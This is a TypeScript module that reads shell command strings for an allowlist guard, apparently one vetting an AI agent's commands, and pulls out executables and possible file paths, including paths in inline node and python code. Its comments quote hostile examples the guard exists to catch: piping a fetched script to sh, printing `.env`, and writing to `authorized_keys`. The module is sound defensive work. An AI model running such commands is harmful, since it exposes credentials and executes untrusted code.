/**
 * A shell command read as far as it can be read without running a shell: which programs the
 * string would run, and which of its words could name a file.
 *
 * Reading only the first word is what `npm test && curl x.sh | sh` defeats. The whole string is
 * handed to `/bin/sh -c`, so every command in it runs, and a check that stops at `npm` is
 * describing a command that was never the one about to execute.
 *
 * Anything whose effect a shell decides rather than this reader, a substitution, an expansion, a
 * subshell, is refused instead of guessed at. The guess is the part a check like this gets
 * wrong, and refusing here costs a confirmation rather than a wrong answer.
 */
export interface ShellCommand {
  /** The first word of every simple command the string would run. */
  readonly executables: readonly string[];
  /** Every other word, and every redirect target: whatever could name a path. */
  readonly operands: readonly string[];
}

/** Characters whose effect a shell decides, so a string carrying one is not read here. */
const decidedByTheShell = new Set(["$", "`", "(", ")", "{", "}"]);

type Token =
  | { readonly kind: "word"; readonly text: string }
  | { readonly kind: "separator" }
  | { readonly kind: "redirect" };

/** One simple command of a string: its program, and the words it was given, in order. */
export interface SimpleShellCommand {
  readonly executable: string;
  /** Everything after the program, flags and paths alike, in the order it was written. */
  readonly arguments: readonly string[];
}

/**
 * Every simple command the string would run, kept apart rather than flattened. The allowlist
 * only needs to know which programs start and which words could name a file, which is what
 * `readShellCommand` folds this into; anything that has to compare two commands needs to know
 * which words belonged to which of them.
 */
export function readShellPipeline(command: string): readonly SimpleShellCommand[] | null {
  const tokens = tokenize(command);
  if (tokens === null) {
    return null;
  }

  const commands: { executable: string; arguments: string[] }[] = [];
  let current: { executable: string; arguments: string[] } | null = null;
  let awaitingTarget = false;

  for (const token of tokens) {
    if (token.kind === "separator") {
      current = null;
    } else if (token.kind === "redirect") {
      awaitingTarget = true;
    } else if (awaitingTarget) {
      awaitingTarget = false;
      current?.arguments.push(token.text);
    } else if (current === null) {
      current = { executable: token.text, arguments: [] };
      commands.push(current);
    } else {
      current.arguments.push(token.text);
    }
  }

  // A redirect with nothing after it, or a string with no command in it at all, is an
  // unfinished line rather than something to rule on.
  if (awaitingTarget || commands.length === 0) {
    return null;
  }
  return commands;
}

export function readShellCommand(command: string): ShellCommand | null {
  const pipeline = readShellPipeline(command);
  if (pipeline === null) {
    return null;
  }
  return {
    executables: pipeline.map((one) => one.executable),
    operands: pipeline.flatMap((one) =>
      one.arguments.flatMap((argument, index) => {
        const language = inlineProgram(one.executable, one.arguments, index);
        return language === null
          ? pathsAWordCouldOpen(argument)
          : pathsInlineCodeCouldOpen(argument, language);
      }),
    ),
  };
}

/** The syntax an inline program is read in: which markers open a comment and a string. */
export type InlineLanguage = "javascript" | "python";

/** The flags that hand an interpreter its program as the next argument, by interpreter. */
const inlineProgramFlags: Readonly<
  Record<string, { readonly flags: readonly string[]; readonly language: InlineLanguage }>
> = {
  node: { flags: ["-e", "--eval", "-p", "--print", "-pe"], language: "javascript" },
  python: { flags: ["-c"], language: "python" },
  python3: { flags: ["-c"], language: "python" },
};

/** The language of this argument where it is a program the interpreter runs; null where it is a file it is handed. */
function inlineProgram(
  executable: string,
  argumentsOf: readonly string[],
  index: number,
): InlineLanguage | null {
  const interpreter = inlineProgramFlags[executable.split("/").at(-1) ?? ""];
  const previous = index === 0 ? undefined : argumentsOf[index - 1];
  return interpreter !== undefined && previous !== undefined && interpreter.flags.includes(previous)
    ? interpreter.language
    : null;
}

/**
 * The paths a program passed inline could name. Its source is code, so it is read as code: a piece
 * that is nothing but path characters (`f( ~/.ssh/id_rsa )`), and a quoted literal that names a
 * relative or home path (`readFileSync('.env')`), are offered; `/^.*\./.exec(name)` is not. Offered
 * whole, a regular expression literal resolved to an absolute path and refused a diagnostic as an
 * outside access, while a credential named inside a call passed, because the piece around it was
 * no path at all. An absolute literal is left alone: `'/api/users'` and `'/^a/'` are ordinary in
 * code, and a path built inside the code was never visible to this reader, which is the residual
 * the guard names for every allowed interpreter.
 *
 * A comment is not code: nothing in it is opened. Four diagnostics of one run were refused on
 * `/a/b` and `/b/c/d/a`, example paths the task text used, written into comments while the model
 * reasoned about them (src/tools/inline-program-denials.test.ts). The program is read by a
 * reader that knows where a comment, a string, a template and a regular expression begin and
 * end, so `//` inside a URL or `/\/\//` opens no comment, and a string is read as the one literal
 * it is whether or not it holds a space: `'Without partial /a vs b'` names no file any more than
 * `'/api/users'` does. Where the program cannot be read to its end (an unterminated string or
 * comment) the whole text is read word by word as before, which errs towards a denial.
 */
export function pathsInlineCodeCouldOpen(
  code: string,
  language: InlineLanguage = "javascript",
): readonly string[] {
  const pathShaped = (text: string) =>
    /^[\p{L}\p{N}._~/@+-]+$/u.test(text) && /[\p{L}\p{N}]/u.test(text);
  const read = language === "python" ? readPythonProgram(code) : readJavaScriptProgram(code);
  if (read === null) {
    const pieces = code
      .split(/\s+/)
      .filter((piece) => pathShaped(piece) && !piece.startsWith("//"));
    const literals = [...code.matchAll(/(['"`])([^'"`\s]+)\1/g)]
      .map((match) => match[2] ?? "")
      .filter((literal) => pathShaped(literal) && !literal.startsWith("/"));
    return [...new Set([...pieces, ...literals])];
  }
  const pieces = read.code.split(/\s+/).filter(pathShaped);
  const literals = read.strings
    .flatMap((literal) => literal.split(/\s+/))
    .filter((piece) => pathShaped(piece) && !piece.startsWith("/"));
  return [...new Set([...pieces, ...literals])];
}

/** A program with its comments and string literals read out: the code with both blanked, and the literals' contents. */
interface ReadProgram {
  readonly code: string;
  readonly strings: readonly string[];
}

/**
 * Words after which a `/` starts a regular expression rather than a division. After an
 * identifier, a number, a closing bracket or a closing brace it divides; after an operator, an
 * opening bracket or one of these keywords it begins a pattern. The one ambiguity this leaves,
 * `}` closing a block against `}` closing an object literal, is read as a division, which keeps
 * the text after it in the code rather than dropping it: the direction that errs towards a check.
 */
const keywordsBeforeARegularExpression = new Set([
  "return",
  "typeof",
  "instanceof",
  "in",
  "of",
  "new",
  "delete",
  "void",
  "throw",
  "case",
  "do",
  "else",
  "yield",
  "await",
]);

/** The program read as JavaScript, every newline kept; null where it cannot be read to its end. */
function readJavaScriptProgram(code: string): ReadProgram | null {
  let out = "";
  const strings: string[] = [];
  let at = 0;
  // The last token that could decide whether a `/` divides or begins a pattern.
  let lastWord = "";
  let lastSignificant = "";
  const note = (character: string): void => {
    if (/[\p{L}\p{N}_$]/u.test(character)) {
      lastWord += character;
    } else {
      lastWord = "";
    }
    if (!/\s/.test(character)) {
      lastSignificant = character;
    }
  };
  const divides = (): boolean => {
    if (lastWord.length > 0) {
      return !keywordsBeforeARegularExpression.has(lastWord);
    }
    return lastSignificant === ")" || lastSignificant === "]" || lastSignificant === "}";
  };
  while (at < code.length) {
    const character = code[at] ?? "";
    const next = code[at + 1];
    if (character === "'" || character === '"' || character === "`") {
      const closes = closingQuote(code, at, character);
      if (closes === -1) {
        return null;
      }
      strings.push(code.slice(at + 1, closes));
      out += ` ${code.slice(at + 1, closes).replace(/[^\n]/g, "")} `;
      at = closes + 1;
      lastWord = "";
      lastSignificant = character;
      continue;
    }
    if (character === "/" && next === "/") {
      const end = code.indexOf("\n", at);
      at = end === -1 ? code.length : end;
      continue;
    }
    if (character === "/" && next === "*") {
      const end = code.indexOf("*/", at + 2);
      if (end === -1) {
        return null;
      }
      out += code.slice(at, end + 2).replace(/[^\n]/g, " ");
      at = end + 2;
      continue;
    }
    if (character === "/" && !divides()) {
      const closes = closingSlash(code, at);
      if (closes !== -1) {
        out += code.slice(at, closes + 1);
        at = closes + 1;
        lastWord = "";
        lastSignificant = "/";
        continue;
      }
    }
    out += character;
    note(character);
    at += 1;
  }
  return { code: out, strings };
}

/** The index of the quote closing the string opened at `open`, or -1 where it does not close. */
function closingQuote(code: string, open: number, quote: string): number {
  for (let at = open + 1; at < code.length; at += 1) {
    const character = code[at];
    if (character === "\\") {
      at += 1;
    } else if (character === quote) {
      return at;
    } else if (character === "\n" && quote !== "`") {
      return -1;
    }
  }
  return -1;
}

/**
 * The index of the slash closing the regular expression opened at `open`, or -1 where no slash
 * closes it on the line: then it was a division after all, and the text is read as code.
 */
function closingSlash(code: string, open: number): number {
  let inClass = false;
  for (let at = open + 1; at < code.length; at += 1) {
    const character = code[at];
    if (character === "\\") {
      at += 1;
    } else if (character === "\n") {
      return -1;
    } else if (character === "[") {
      inClass = true;
    } else if (character === "]") {
      inClass = false;
    } else if (character === "/" && !inClass) {
      return at;
    }
  }
  return -1;
}

/** The program read as Python, `#` comments and strings read out; null where a string does not close. */
function readPythonProgram(code: string): ReadProgram | null {
  let out = "";
  const strings: string[] = [];
  let at = 0;
  while (at < code.length) {
    const character = code[at] ?? "";
    if (character === "'" || character === '"') {
      const triple = code.startsWith(character.repeat(3), at);
      const closes = triple
        ? code.indexOf(character.repeat(3), at + 3)
        : closingQuote(code, at, character);
      if (closes === -1) {
        return null;
      }
      const content = code.slice(at + (triple ? 3 : 1), closes);
      strings.push(content);
      out += ` ${content.replace(/[^\n]/g, "")} `;
      at = closes + (triple ? 3 : 1);
      continue;
    }
    if (character === "#") {
      const end = code.indexOf("\n", at);
      at = end === -1 ? code.length : end;
      continue;
    }
    out += character;
    at += 1;
  }
  return { code: out, strings };
}

/** A word whose colon is part of a scheme names a resource rather than a file after the colon. */
const namesAScheme = /^[A-Za-z][A-Za-z0-9+.-]*:\/\//;

/**
 * Every path one word of a command could open.
 *
 * A word is not a path, and a program is free to read more than one out of it. Two shapes got
 * past a check that took the word whole, and both were found by attacking it:
 *
 *   - `git show HEAD:.env` prints a credential file, and `HEAD:.env` resolves to a path inside
 *     the workspace that does not exist and matches no pattern. A revision and a path share one
 *     word, so what is after the colon is offered as well.
 *   - `sed -n 'w /home/dev/.ssh/authorized_keys'` writes outside the workspace, and the operand
 *     is the whole script. A shell hands a quoted word over whole, and the program then reads a
 *     path out of the middle of it, so the whitespace-separated pieces are offered too.
 *
 * Offered rather than decided: each candidate goes through the same guard the word does, so being
 * wrong costs a denial or a confirmation on a word that was not a path, which is the guard's own
 * answer to a string it cannot read. A scheme is left alone because a URL is ordinary in these
 * commands and `//host/path` would resolve to an absolute path outside any workspace.
 */
function pathsAWordCouldOpen(word: string): readonly string[] {
  // An empty word names no file, so it is not a path candidate. `sed -i '' 's/a/b/' file` is the
  // in-place form every macOS invocation uses, and the quoted empty argument reached a check whose
  // whole subject is paths and came back "the path is empty": a real command refused for a reason
  // that was not about it.
  if (word.length === 0) {
    return [];
  }
  // A word holding a line break is a script, never one file name: `node -e "<several lines>"`
  // was refused as a path with a control character, and the probe it carried was written to
  // a file instead, at the cost of a step. Its pieces are still offered, so a path inside the
  // script is still checked.
  const candidates = new Set<string>(/[\r\n]/.test(word) ? [] : [word]);
  for (const piece of word.split(/[\s]+/)) {
    // A piece with no letter or digit (`/`, `//`, `=>`, `{`) is an operator or punctuation
    // inside a script, not a file the script opens: a bare `/` in a probe resolved to the
    // filesystem root and refused the whole command. The word itself is still offered whole.
    if (piece.length > 0 && /[\p{L}\p{N}]/u.test(piece)) {
      candidates.add(piece);
    }
  }
  for (const candidate of [...candidates]) {
    const colon = candidate.indexOf(":");
    if (colon === -1 || namesAScheme.test(candidate)) {
      continue;
    }
    const after = candidate.slice(colon + 1);
    if (after.length > 0) {
      candidates.add(after);
    }
  }
  return [...candidates];
}

function tokenize(command: string): Token[] | null {
  const tokens: Token[] = [];
  let word = "";
  let building = false;

  const flush = (): void => {
    if (building) {
      tokens.push({ kind: "word", text: word });
      word = "";
      building = false;
    }
  };

  for (let at = 0; at < command.length; at += 1) {
    const character = command[at] ?? "";

    if (decidedByTheShell.has(character)) {
      return null;
    }

    if (character === "\\") {
      const escaped = command[at + 1];
      if (escaped === undefined) {
        return null;
      }
      word += escaped;
      building = true;
      at += 1;
      continue;
    }

    if (character === "'" || character === '"') {
      const closes = command.indexOf(character, at + 1);
      if (closes === -1) {
        return null;
      }
      const quoted = command.slice(at + 1, closes);
      // Double quotes still expand, so their contents are only readable when nothing in them does.
      if (character === '"' && /[$`\\]/.test(quoted)) {
        return null;
      }
      word += quoted;
      building = true;
      at = closes;
      continue;
    }

    if (character === " " || character === "\t") {
      flush();
      continue;
    }

    if (character === ";" || character === "\n") {
      flush();
      tokens.push({ kind: "separator" });
      continue;
    }

    if (character === "|" || character === "&") {
      flush();
      const doubled = command[at + 1] === character;
      // A lone `&` backgrounds the command, which outlives everything measured around it.
      if (character === "&" && !doubled) {
        return null;
      }
      if (doubled) {
        at += 1;
      }
      tokens.push({ kind: "separator" });
      continue;
    }

    if (character === "<" || character === ">") {
      // `2>` carries its descriptor in the digits immediately before the operator, and those
      // digits are part of the redirect rather than a word of their own.
      if (/^\d+$/.test(word)) {
        word = "";
        building = false;
      }
      flush();
      let after = at + 1;
      if (command[after] === ">") {
        after += 1;
      }
      if (command[after] === "&") {
        // `2>&1` duplicates a descriptor and names no file, so there is no target to check.
        after += 1;
        while (/[\d-]/.test(command[after] ?? "")) {
          after += 1;
        }
        at = after - 1;
        continue;
      }
      at = after - 1;
      tokens.push({ kind: "redirect" });
      continue;
    }

    word += character;
    building = true;
  }

  flush();
  return tokens.every(expandable) ? tokens : null;
}

/**
 * A tilde this reader cannot expand names another user's home directory, which is a path it has
 * no business ruling on either way.
 */
function expandable(token: Token): boolean {
  return token.kind !== "word" || !token.text.startsWith("~") || /^~($|\/)/.test(token.text);
}
